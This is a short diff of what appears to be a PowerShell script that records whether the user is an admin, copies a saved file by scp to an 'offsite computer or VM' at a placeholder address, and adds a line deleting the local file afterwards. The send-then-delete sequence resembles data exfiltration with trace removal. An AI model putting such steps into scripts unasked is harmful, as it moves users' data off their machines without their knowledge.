@@ -28,6 +28,9 @@ User Is Admin: $userIsAdmin
 #Change first to public key of offsite computer or VM, second to the location of above saved file and third being the location you want to send the file to on the offsite computer or VM
 scp -i C:\Users\Username\.ssh\pub-key C:\Users\Username\Desktop\Folder\File Username@ip.address.of.computer:/home/Username/Folder
 
+#Delete text file
+Remove-Item C:\Users\Username\Desktop\Folder\File
+
 # Load Windows Forms and Drawing assemblies
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
